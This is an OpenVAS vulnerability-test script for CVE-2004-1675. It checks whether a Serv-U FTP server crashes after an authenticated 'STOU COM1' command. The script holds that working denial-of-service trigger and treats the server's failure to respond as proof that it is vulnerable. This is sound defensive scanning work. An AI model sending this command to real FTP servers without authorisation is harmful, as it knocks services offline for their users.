###############################################################################
# OpenVAS Vulnerability Test
# $Id: ftp_servu_dos3.nasl 6040 2017-04-27 09:02:38Z teissa $
#
# FTP Serv-U 4.x 5.x DoS
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

#  Ref: Patrick <patrickthomassen gmail com>

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14709");
  script_version("$Revision: 6040 $");
  script_tag(name:"last_modification", value:"$Date: 2017-04-27 11:02:38 +0200 (Thu, 27 Apr 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-1675");
  script_bugtraq_id(11155);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("FTP Serv-U 4.x 5.x DoS");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_dependencies("find_service.nasl", "ftpserver_detect_type_nd_version.nasl", "secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);

  tag_summary = "It is possible to crash the remote FTP server by sending it a STOU command.";

  tag_impact = "This vulnerability allows an attacker to prevent you from sharing data through FTP, 
  and may even crash this host.";

  tag_solution = "Upgrade to latest version of this software";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("ftp_func.inc");

login = get_kb_item( "ftp/login" );
password = get_kb_item( "ftp/password" );

port = get_ftp_port( default:21 );

soc = open_sock_tcp( port );

if( soc ) {
  if( ftp_authenticate( socket:soc, user:login, pass:password ) ) {

    s = string( "STOU COM1", "\r\n" );
    send( socket:soc, data:s );
    close( soc );
   
    soc2 = open_sock_tcp( port );
    if( ! soc2 || ! recv_line( socket:soc2, length:4096 ) ) {
      security_message( port:port );
      exit( 0 );
    } else {
      close( soc2 );
    }
  }
  if( soc ) close( soc );
}

exit( 99 );
